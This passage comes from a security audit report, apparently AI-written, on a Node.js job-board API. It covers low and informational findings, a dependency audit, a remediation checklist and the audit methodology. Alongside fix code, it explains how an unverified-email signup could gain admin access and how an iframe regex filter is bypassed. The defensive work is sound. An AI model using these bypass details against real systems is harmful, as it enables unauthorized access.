- **Description:** Mongoose validation errors, Cloudinary URL strings, internal hostnames, file paths, and stack-tracing-adjacent details can leak through `err.message` to anyone with admin secret access. Since the scraper auth model is a single shared key, this is more exposure than warranted.
- **Remediation:** Use the existing `apiErrorHandler` (which logs the full error and returns a generic message), and only surface validation-shaped messages explicitly. Match the style used in `controllers/admin/jobsV2.controllers.js`.

---

### `CAT-SEC-015` — `helmet()` defaults only; no explicit CSP or HSTS configuration
- **Severity:** **Low** (CVSS 3.1: 3.1)
- **Category:** OWASP A05:2021 · CWE-693 (Protection Mechanism Failure)
- **Location:** `app.js:52`
- **Description:** Helmet v8's defaults are sane, but on an API-only server you should explicitly turn off the CSP middleware (it is configured for HTML by default and can confuse clients) or set a JSON-friendly CSP (`default-src 'none'`, `frame-ancestors 'none'`), and explicitly enable HSTS with a long max-age + `includeSubDomains` if HTTPS-terminating in front of this service.
- **Remediation:**
  ```js
  app.use(helmet({
      contentSecurityPolicy: { directives: { defaultSrc: ["'none'"], frameAncestors: ["'none'"] } },
      hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
      crossOriginResourcePolicy: { policy: "same-site" },
  }));
  ```

---

### `CAT-SEC-016` — `trust proxy: 1` may misattribute IPs behind multi-hop infrastructure
- **Severity:** **Low** (CVSS 3.1: 3.7)
- **Category:** CWE-348 (Use of Less Trusted Source)
- **Location:** `app.js:23`
- **Description:** `app.set("trust proxy", 1)` accepts the *last* `X-Forwarded-For` hop as the client. If the deploy fronts the API with a CDN + a load balancer + an ingress (3 hops), the rate limiter and `req.ip` will see the LB's IP, not the user's, allowing rate-limit bypass and skewing `ipHash`.
- **Remediation:** Set `trust proxy` to the exact number of trusted reverse proxies in your deployment, or to a CIDR list of the ingress IPs. See [express-rate-limit — trust proxy](https://www.npmjs.com/package/express-rate-limit#troubleshooting-proxy-issues).

---

### `CAT-SEC-017` — `escapeRegex` duplicated between `Helpers/controllerHelper.js` and `scraper/ingester.js`
- **Severity:** **Informational**
- **Category:** Defense-in-depth
- **Location:** `Helpers/controllerHelper.js:4`, `scraper/ingester.js:103-105`
- **Description:** Two copies; the scraper's copy is identical today but a future change in one will not propagate to the other, weakening ReDoS / regex-injection defenses. Recommend importing from a single helper. Also ensure all uses of user-controlled regex pass through this helper — every `$regex` site in the audited code currently does.

---

### `CAT-SEC-018` — `@anthropic-ai/sdk` required at runtime but not declared in `package.json`
- **Severity:** **Informational** (reliability, not security)
- **Location:** `scraper/providers/claude.js:1`
- **Description:** `require("@anthropic-ai/sdk")` will throw `Cannot find module` if `AI_PROVIDER=claude` is set in production. Add to `dependencies`:
  ```json
  "@anthropic-ai/sdk": "^0.32.1"
  ```
  Note for ops: if your runbook ever sets `AI_PROVIDER=claude` as a fallback, this is a hidden landmine that crashes the cron run.

---

### `CAT-SEC-019` — `Helpers/controllerHelper.countTotalEntries` mutates caller's filter object
- **Severity:** **Informational** (correctness; not security)
- **Location:** `Helpers/controllerHelper.js:16-27`
- **Description:** When `filteredData` is truthy, the function does `filter.$or = [...]`, overwriting any `$or` previously set by the caller (e.g., the `query` search OR-clause in `getJobs`). Result: the count in `jobDetailsHandler`'s response can be larger than the actual filtered set when both `query` and `filterData=1` are used.
- **Remediation:** Build a fresh filter:
  ```js
  const countFilter = { ...filter };
  if (filteredData) {
      countFilter.isActive = true;
      const expiry = { $or: [{ expiresAt: { $exists: false } }, { expiresAt: { $gte: new Date() } }] };
      if (countFilter.$or) {
          countFilter.$and = [{ $or: countFilter.$or }, expiry];
          delete countFilter.$or;
      } else {
          Object.assign(countFilter, expiry);
      }
  }
  return Jobdesc.countDocuments(countFilter);
  ```

---

### `CAT-SEC-020` — `parseCookieHeader` is a hand-rolled cookie parser
- **Severity:** **Informational**
- **Location:** `middleware/sessionCookie.js:13-24`
- **Description:** Hand-rolled cookie parsing tends to drift from RFC 6265 (quoted values, `Cookie` folding, etc.). Prefer the `cookie` package (already a transitive dep of `express`) or `req.cookies` via `cookie-parser`. Today it functions because the cookie value is a nanoid alphabet, but the helper is unnecessary attack surface.

---

### `CAT-SEC-021` — Cookie hash uses fast SHA-256, not HMAC
- **Severity:** **Informational**
- **Location:** `middleware/sessionCookie.js:26-28`
- **Description:** `sha256(ip + PEPPER)` is a salted (peppered) hash, not a keyed MAC. If `PEPPER` ever leaks via logs/config, the entire space of IPv4 (~4 billion) is brute-forceable in seconds. Use HMAC-SHA-256:
  ```js
  return crypto.createHmac("sha256", PEPPER).update(String(ip || "")).digest("hex");
  ```
  Same security argument applies; HMAC is the canonical primitive for this case.

---

### `CAT-SEC-022` — Auth middleware does not require `email_verified === true`
- **Severity:** **Informational** (depends on Firebase project's signup flow)
- **Location:** `middleware/auth.js:11-15`
- **Description:** The middleware sets `req.firebaseUser.emailVerified` but does not enforce it. If signup in the Firebase project allows email/password without verification, an attacker can register `attacker@gmail.com`, sign in, get a valid ID token, and pass `requireAuth` — gaining full admin. The first defense is to use Firebase custom claims (e.g., `admin: true`) and reject any token without that claim. The second is to refuse unverified emails:
  ```js
  if (decoded.email_verified !== true) {
      return res.status(403).json({ error: "Email not verified" });
  }
  ```
  This is **High** severity if your Firebase project allows public signups; **Informational** if signup is invite-only.

---

### `CAT-SEC-023` — File-upload type check is by client-asserted MIME, not by content
- **Severity:** **Informational** (paired with `CAT-SEC-008`)
- **Location:** `controllers/jobs.controllers.js:257-263`, `controllers/common.js:17-19`, `blog/blog.controllers.js:205-209`
- **Description:** `file.mimetype` from `express-fileupload` reflects whatever the client claimed in the multipart `Content-Type`. The accept-list also includes `image/svg+xml` (see `CAT-SEC-008`). After dropping SVG, validate by magic bytes — e.g., with `file-type`:
  ```js
  const { fileTypeFromFile } = await import("file-type");
  const ft = await fileTypeFromFile(file.tempFilePath);
  if (!ft || !["jpg", "png", "webp"].includes(ft.ext)) {
      return res.status(400).json({ error: "Invalid file content" });
  }
  ```

---

### `CAT-SEC-024` — Admin write endpoints accept arbitrary `priority`, `isVerified`, `isFeaturedJob` from request body
- **Severity:** **Informational** (intentional but worth scoping)
- **Location:** `controllers/jobs.controllers.js:187-198` (v1 update), `controllers/jobs.controllers.js:238-249` (v1 add), validators in `validators/jobV2.js:96-99`, `validators/companyV2.js:96-97`
- **Description:** All admin auth principals can self-promote any job to `priority: 999`, `isFeaturedJob: true`, `isVerified: true`. If the project introduces multiple admin tiers (e.g., editor vs publisher vs sponsor-manager), these fields must be gated behind a more privileged role. Today there is only one admin tier, so this is documentation; flag for design when role separation lands.

---

### `CAT-SEC-025` — `iframe` allowed in blog markdown sanitizer schema; secondary regex filter is bypassable
- **Severity:** **Informational** (mitigated by `allowDangerousHtml: false`)
- **Location:** `blog/markdown.service.js:46-69`, `blog/markdown.service.js:79-87`
- **Description:** `rehype-sanitize` is configured to allow `<iframe>` with `src/width/height/frameborder/allow/allowfullscreen/title`. After serialization, a regex strips `<iframe>` tags whose `src` doesn't match a YouTube/Vimeo allowlist. The regex requires `src="..."` with double quotes — single-quoted, unquoted, or attribute-reordered iframes (`<iframe title="..." src=...>`) are not matched and pass through unchanged.

  The current import chain is safe today because `remark-rehype` is invoked with `allowDangerousHtml: false`, so raw HTML in markdown is dropped before `rehype-sanitize` runs and `<iframe>` cannot enter the AST from author input. If anyone later flips that flag (e.g., to support inline HTML), this filter falls open.
- **Remediation:** Implement the YouTube/Vimeo allowlist inside the `rehype-sanitize` schema as an attribute filter (or a custom rehype plugin), not via post-stringify regex. Drop `iframe` from the schema if embeds aren't actually used.

---

## 4. Dependency Audit

Resolved versions from `package-lock.json`:

| Package | Version | Notes |
|---|---|---|
| `express` | 4.22.1 | Latest 4.x; no open advisories. |
| `express-fileupload` | 1.5.2 | Latest. Earlier 1.x had prototype pollution (GHSA-pmh6-pp75-2v94, fixed 1.4.0). OK. |
| `express-rate-limit` | 8.3.2 | Latest. |
| `mongoose` | 8.23.0 | Latest. |
| `helmet` | 8.1.0 | Latest. |
| `axios` | 1.14.0 | Past advisories: GHSA-jr5f-v2jv-69x6 (SSRF, ≤1.7.3) and GHSA-wf5p-g6vw-rhxx (DoS, ≤1.8.1) — both fixed before 1.14. OK. |
| `nanoid` | 3.3.11 | GHSA-mwcw-c2x4-8c55 affected <3.3.8 (predictable IDs). Fixed. |
| `firebase-admin` | 13.7.0 | Latest. |
| `cors` | 2.8.5 | Stable. Note: configuration matters more than the package — see app.js:44-50. |
| `cheerio` | 1.2.0 | OK; no current advisories. |
| `cloudinary` | 2.9.0 | OK. |
| `node-cron` | 4.2.1 | OK. |
| `sharp` | 0.34.5 | OK. |
| `zod` | 4.3.6 | OK. |
| `uuid` | 13.0.0 | OK. |
| **`@anthropic-ai/sdk`** | **missing** | Required by `scraper/providers/claude.js` but **not** declared. Crashes if `AI_PROVIDER=claude`. See `CAT-SEC-018`. |
| `@google/generative-ai` | 0.24.1 | Note: Google has marked this SDK deprecated in favor of `@google/genai`. Plan migration. |
| `groq-sdk` | 1.1.2 | OK. |

**Action items:**
- Run `npm audit --omit=dev` in CI on every PR; fail on High/Critical.
- Add `@anthropic-ai/sdk` to `dependencies` *or* delete `scraper/providers/claude.js` if Claude is not actually used.
- Pin via `package-lock.json` (already present) and add `npm ci` (not `npm install`) to deploy scripts.

---

## 5. Hardening Checklist (prioritized backlog)

### P0 — do today
- [ ] **`CAT-SEC-001`** Rotate MongoDB user password, both Cloudinary API secrets, `ADMIN_API_KEY`, Firebase service account JSON, AI-provider keys, Telegram bot token. Replace `.env.example` with placeholders. Purge from git history with `git filter-repo`. Add `gitleaks` / GitHub secret scanning to CI.
- [ ] **`CAT-SEC-006`** Switch ScraperAPI URL to `https://`; rotate `SCRAPERAPI_KEY` after the change.
- [ ] **`CAT-SEC-002`** Remove the legacy `x-api-key` / short-Bearer fallback in `middleware/auth.js`. If a transition window is needed, IP-allowlist the legacy branch and add metrics to drive usage to zero.
- [ ] **`CAT-SEC-003`** Replace `===`/`!==` secret comparisons with `crypto.timingSafeEqual` (auth.js + scraper/admin.routes.js).
- [ ] **`CAT-SEC-022`** Enforce `decoded.email_verified === true` in `requireAuth` and require an `admin` Firebase custom claim.

### P1 — this week
- [ ] **`CAT-SEC-004`** Allowlist override fields on `POST /api/admin/scrape/staging/:id/approve`.
- [ ] **`CAT-SEC-005`** Apply Zod `validateQuery` to the public + admin blog list, scraper staging list, and v1 jobs/companies list. Or set `app.set("query parser", "simple")` globally.
- [ ] **`CAT-SEC-007`** Move scraper admin behind Firebase auth + `admin` claim; add audit logging of `who approved what` into `ScrapeLog`.
- [ ] **`CAT-SEC-008` / `CAT-SEC-023`** Drop `image/svg+xml` from upload allowlists; verify uploads by magic bytes (`file-type`).
- [ ] **`CAT-SEC-009`** Add a public-HTTPS-only URL guard around `fetchPage` and `downloadAndReupload`. Block RFC1918, link-local, loopback. Verify after final redirect.
- [ ] **`CAT-SEC-010`** Per-`(sessionHash, jobId, eventType)` dedupe with a 30-minute bucket; add per-IP click rate limit.
- [ ] **`CAT-SEC-011`** `httpOnly: true` on `cat_sess`.
- [ ] **`CAT-SEC-018`** Declare or remove `@anthropic-ai/sdk`.

### P2 — within the month
- [ ] **`CAT-SEC-012`** Apply-link host allowlist + interstitial.
- [ ] **`CAT-SEC-013`** Escape Telegram alert interpolations.
- [ ] **`CAT-SEC-014`** Replace direct `err.message` returns in `scraper/admin.routes.js` with `apiErrorHandler`.
- [ ] **`CAT-SEC-015`** Explicit Helmet config (CSP, HSTS).
- [ ] **`CAT-SEC-016`** Confirm `trust proxy` matches the actual deployment topology.
- [ ] **`CAT-SEC-017`** Consolidate `escapeRegex` into a single helper.
- [ ] **`CAT-SEC-019`** Fix `countTotalEntries` filter mutation.
- [ ] **`CAT-SEC-020`** Replace hand-rolled cookie parser with `cookie` lib.
- [ ] **`CAT-SEC-021`** HMAC-SHA-256 for the IP-hash pepper.
- [ ] **`CAT-SEC-024`** Plan admin-tier separation; gate `priority`, `isFeaturedJob`, `isVerified` writes behind a dedicated role.
- [ ] **`CAT-SEC-025`** Move iframe allowlist into `rehype-sanitize` schema (or remove iframe support).

---

## 6. Appendix

### Methodology
1. Enumerated repo via `find` and reviewed `package.json` + `app.js` to map framework, entry points, and dependency surface.
2. Read every middleware (`middleware/`), every route file (`routes/`, `blog/blog.routes.js`, `blog/blog.admin.routes.js`, `scraper/admin.routes.js`), and every controller they invoke.
3. Read all Mongoose schemas, all Zod validators, and the slug/regex helpers.
4. Walked the scraper end-to-end: adapters → `scraper.js` → `transformer.js` → providers → `ingester.js` → `scheduler.js` → `notifier.js`.
5. Walked the blog pipeline: validators → `blog.service.js` → `markdown.service.js` → `cloudinary.service.js` → `blog.scheduler.js`.
6. Inspected `.env.example`, `.gitignore`, and `git log -p -- .env.example` for committed secrets.
7. Resolved dependency versions from `package-lock.json` and cross-checked against known advisories from training data (no live `npm audit` was executed in this audit; recommend running it in CI).

### Tools assumed (not run during audit)
- `npm audit` / `npm outdated`
- `gitleaks` / `trufflehog` for secret scanning
- DAST: ZAP / Burp Suite for live request fuzzing once a non-prod environment is available
- A penetration test focused on the scraper SSRF posture in a real cloud environment

### Coverage gaps
- **Production deployment configuration** is not in the repo (no Dockerfile, no CI/CD workflow files, no infrastructure-as-code). Phases 9 (IaC/Deployment) and the operational portion of Phase 11 (logging/monitoring) cannot be assessed from source alone. Recommend a follow-up review of the deploy host's TLS termination, IMDS posture, container user, and log destination.
- **Frontend code** is out of scope; many of the findings (XSS via SVG, view inflation, open redirect) interact with frontend behavior and need a corresponding client-side review.
- **Live behavior of `requireAuth`** with realistic Firebase tokens was not exercised; recommend an integration-test pass that asserts both the success path and the rejection of unverified emails / tokens lacking the admin claim.
- **Data-at-rest encryption** (MongoDB Atlas-side) and backup posture are infrastructure concerns and were not assessed.
- **Rate-limit store**: `express-rate-limit` defaults to in-memory. In a multi-instance deploy this is per-process, effectively multiplying the cap by the instance count. Confirm the production setup uses a shared store (Redis) if running >1 instance.

### Suggested follow-ups
1. A live pentest after `CAT-SEC-001` and `CAT-SEC-002` are remediated; the public-internet exposure today is the dominant risk and would distort any other testing.
2. A threat-model workshop for the scraper, focused on supply-chain content (LLM output → DB → user redirect) and SSRF posture.
3. Adopt CodeQL or Semgrep with rules for: NoSQL injection (operator passthrough), open redirect, SSRF, and hard-coded secrets — wired into the PR pipeline.
4. Add a CONTRIBUTING.md security section instructing devs never to put real values in `.env.example`.

— end of report —
